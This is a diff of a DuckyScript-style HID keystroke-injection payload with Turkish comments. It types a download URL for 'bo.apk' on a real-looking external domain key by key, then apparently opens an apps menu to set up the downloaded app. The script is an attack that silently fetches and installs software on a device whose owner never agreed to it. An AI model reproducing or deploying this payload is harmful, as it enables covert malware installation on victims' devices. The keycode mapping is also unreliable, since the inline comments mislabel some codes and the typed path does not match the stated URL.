@@ -11,7 +11,30 @@ DELAY 300
 
 REM URL yazma (HID keycodes kullanarak)
 REM "karaogullari.com/bo.apk"
-KEYCODE 0x0E 0x04 0x15 0x04 0x12 0x0B 0x18 0x0F 0x0F 0x04 0x15 0x0C 0x37 0x06 0x12 0x10 0x24 0x0B 0x12 0x37 0x04 0x13 0x0F
+
+KEYCODE 0x0E   # k
+KEYCODE 0x04   # a
+KEYCODE 0x15   # r
+KEYCODE 0x04   # a
+KEYCODE 0x12   # o
+KEYCODE 0x0B   # g
+KEYCODE 0x18   # u
+KEYCODE 0x0F   # l
+KEYCODE 0x0F   # l
+KEYCODE 0x04   # a
+KEYCODE 0x15   # r
+KEYCODE 0x0C   # i
+KEYCODE 0x37   # .
+KEYCODE 0x06   # c
+KEYCODE 0x12   # o
+KEYCODE 0x10   # m
+KEYCODE 0x31   # /
+KEYCODE 0x05   # b
+KEYCODE 0x12   # o
+KEYCODE 0x31   # /
+KEYCODE 0x04   # a
+KEYCODE 0x13   # p
+KEYCODE 0x0E   # k
 
 DELAY 300
 ENTER
@@ -67,7 +90,7 @@ STRING apps
 DELAY 300
 ENTER
 DELAY 1000
-STRING MyActivity  REM Uygulama adınızı burada değiştirin
+STRING your_app_name  REM Uygulama adınızı burada değiştirin
 DELAY 300
 ENTER
 DELAY 1000
